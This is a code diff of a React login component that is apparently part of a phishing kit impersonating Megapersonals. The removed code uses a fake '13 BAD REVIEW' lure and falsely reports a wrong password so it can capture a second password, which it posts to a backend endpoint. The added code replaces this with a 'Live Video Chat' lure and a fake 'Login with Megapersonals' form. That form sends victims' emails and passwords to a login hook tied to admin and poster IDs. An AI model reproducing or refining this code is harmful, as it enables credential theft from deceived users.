@@ -1,140 +1,76 @@
 "use client";
-import { Field, Form, Formik } from "formik";
 import { site } from "../config/index";
+import Image from "next/image";
 import useMockLogin from "../hooks/useMockLogin";
 import { useState } from "react";
-import { toast } from "react-toastify";
-import { useRouter } from "next/navigation";
-import Cookies from "js-cookie";
-import { API_URL } from "../config";
 
 function LoginForm({ adminId, posterId }) {
-  const router = useRouter();
-  const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-  const [wrongPassword, setWrongPassword] = useState("");
-  const [showWrongPassword, setShowWrongPassword] = useState(false);
+  const [email, setEmail] = useState("");
+
   const { login } = useMockLogin(adminId, posterId);
 
-  const handleSubmit = () => {
-    const submitValues = {
+  const handleSubmit = async () => {
+    const allValues = {
       site: site,
       email: email,
       password: password,
-    };
-    login(submitValues);
-    setShowWrongPassword(true);
-    toast.success("Wrong password, try again");
-    console.log(submitValues);
-  };
-  const handleWrongPassword = async () => {
-    const url = `${API_URL}/add/wrongpassword`;
-    const id = Cookies.get("id");
-    const values = {
-      id,
-      wrongPassword,
+      skipcode: "",
     };
 
-    const res = await fetch(url, {
-      method: "POST",
-      headers: {
-        Accept: "application/json",
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify(values),
-    });
-    const data = await res.json();
-    console.log(data);
+    await login(allValues);
+    setEmail("");
+    setPassword("");
 
-    if (res.ok) {
-      console.log("success", data);
-      setEmail("");
-      setPassword("");
-      setWrongPassword("");
-      router.push(`/imgPage`);
-    } else {
-      console.log("error", data);
-      toast.error("Something Went Wrong");
-    }
+    console.log("allValues", allValues);
   };
+
   return (
-    <div className="mt-5 w-[80%] md:w-[50%] bg-white   rounded-lg mx-auto">
-      <div className=" mt-5 font-bold text-[#222222] text-center ">
-        <p className="text-3xl font-bold text-[#222222] text-center ">
-          <span className="text-[#e89a4c]">Mega</span>{" "}
-          <span className="text-[#6495ED]">Personals</span>
+    <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
+      <p class="text-3xl font-semibold ">Live Video Chat</p>
+      <p class="mt-3 leading-relaxed max-w-[32ch] mx-auto [&amp;>span]:font-semibold">
+        Know each other and enjoy{" "}
+        <span class="text-green-500">private, secure</span>
+        <span class="text-green-500"></span> and{" "}
+        <span class="text-green-500">hasslefree</span> live moment with your
+        dating partner
+      </p>
+      <img src="/images/devilgirl.png" width="180xp" height="120px" alt="" />{" "}
+      <p class="text-xl font-semibold mt-3 text-center">
+        Login with Megapersonals
+      </p>
+      <div class="flex flex-col gap-y-4 mt-4">
+        <p
+          class="bg-neutral-200 p-2 rounded text-sm"
+          id="msg"
+          style={{ display: "none" }}
+        >
+          Please enter correct password
         </p>
-        <p className="text-xl mt-2">13 BAD REVIEW</p>
-        <p className="text-2xl text-blue-700">
-          Confirm your own account before
-        </p>
-        <p className="text-2xl text-[#e89a4c]">
-          VIEW / REMOVE <span className="text-blue-700">review</span>
-        </p>
-      </div>
-
-      <div className="mt-5">
         <input
-          className="w-full text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-          placeholder="Your email"
-          name="email"
+          required=""
+          class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
+          placeholder="Enter email here"
           type="email"
-          autoComplete="on"
+          name="email"
           value={email}
           onChange={(e) => setEmail(e.target.value)}
-          required
         />
-
-        {!showWrongPassword ? (
-          <>
-            <input
-              className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-              placeholder="Password"
-              name="password"
-              type="password"
-              autoComplete="on"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              required
-            />
-          </>
-        ) : (
-          <input
-            className="w-full mt-5 text-lg px-[8px] py-[7px] outline-none border border-gray-400 rounded-md shadow-inner placeholder:font-medium placeholder:text-black/50"
-            placeholder="Password"
-            name="wrongPassword"
-            type="password"
-            autoComplete="on"
-            value={wrongPassword}
-            onChange={(e) => setWrongPassword(e.target.value)}
-            required
-          />
-        )}
-        {showWrongPassword ? (
-          <p className="text-red-500 text-lg font-medium text-center">
-            Wrong Password, try again
-          </p>
-        ) : null}
-        {!showWrongPassword ? (
-          <button
-            type="button"
-            onClick={handleSubmit}
-            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
-          >
-            SUBMIT
-          </button>
-        ) : (
-          <button
-            type="submit"
-            // type="button"
-            className="mt-5 w-full rounded-md  font-medium bg-[#e89a4c] hover:bg-[#1a73e8] py-[10px] text-white transition duration-300 uppercase"
-            // disabled={!verified}
-            // onClick={handleNextStep}
-            onClick={handleWrongPassword}
-          >
-            SUBMIT
-          </button>
-        )}
+        <input
+          required=""
+          class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
+          placeholder="Enter password here"
+          type="password"
+          name="password"
+          value={password}
+          onChange={(e) => setPassword(e.target.value)}
+        />
+        <button
+          onClick={handleSubmit}
+          class="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200"
+        >
+          Submit
+        </button>
       </div>
     </div>
   );
